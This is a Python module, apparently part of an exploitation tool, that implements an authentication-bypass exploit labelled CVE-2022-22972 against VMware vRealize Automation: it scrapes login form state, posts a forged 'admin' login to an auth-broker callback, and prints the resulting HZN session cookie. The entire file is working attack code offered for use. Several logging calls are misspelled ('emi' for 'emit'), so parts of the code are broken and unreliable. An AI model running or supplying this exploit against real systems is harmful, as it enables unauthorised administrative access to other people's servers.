import urllib3
import requests
from bs4 import BeautifulSoup
from utils.output import output_format

urllib3.disable_warnings()

class cve_2022_22972_get_cookie:

    def __init__(self, url_text, update_date):
        _url = str(url_text.text())
        if _url.endswith("/"):
            self.url = _url[:-1]
        else:
            self.url = _url
        self.update_date = update_date
        if self.url == "":
            self.update_date.emit(output_format("ERROR", "What's your url?"))

    def get_cookie(self):
        try:
            s = requests.Session()
            s.get(self.url + "/vcac", verify=False, allow_redirects=True)
            self.update_date.emi(output_format("INFO", "Start to extract state from vcac redirects..."))
            params = {
                "original_uri": f"{self.url}/vcac",
            }
            resp = s.get(self.url + "/vcac/", verify=False, allow_redirects=True, params=params)
            soup = BeautifulSoup(resp.text, 'html.parser')
            form = soup.find('form')
            if not form:
                self.update_date.emi(output_format("ERROR", "Form not found for /vcac endpoint. This might be patched or you may be using this against something that isnt vRealize Automation"))
            else:
                data = {
                    'protected_state': form.find('input', {'id': 'protected_state'}).get('value'),
                    'userstore': form.find('input', {'id': 'userstore'}).get('value'),
                    'username': "admin",
                    'password': '123',
                    'userstoreDisplay': form.find('input', {'id': 'userstoreDisplay'}).get('value'),
                    'horizonRelayState': form.find('input', {'name': 'horizonRelayState'}).get('value'),
                    'stickyConnectorId': form.find('input', {'name': 'stickyConnectorId'}).get('value'),
                    'action': 'Sign+in'
                }
                body = ""
                for k, v in data.items():
                    body += f'{k}={v}&'
                body = body[0:len(body) - 1]
                req = s.prepare_request(requests.Request('POST', self.url + "/SAAS/auth/login/embeddedauthbroker/callback", data=body))
                req.headers.update({
                    "Content-type": "application/x-www-form-urlencoded",
                })
                self.update_date.emi(output_format("INFO", "Start to send POST to auth endpoint..."))
                s.send(req, verify=False, allow_redirects=False)
                self.update_date.emi(output_format("SUCCESS", f"Get the bypass cookie successfully!\nHZN={s.cookies.get('HZN')}"))
        except Exception as e:
            self.update_date.emit(output_format("ERROR", f"Fail to get the bypass cookie. Error message: {str(e)}"))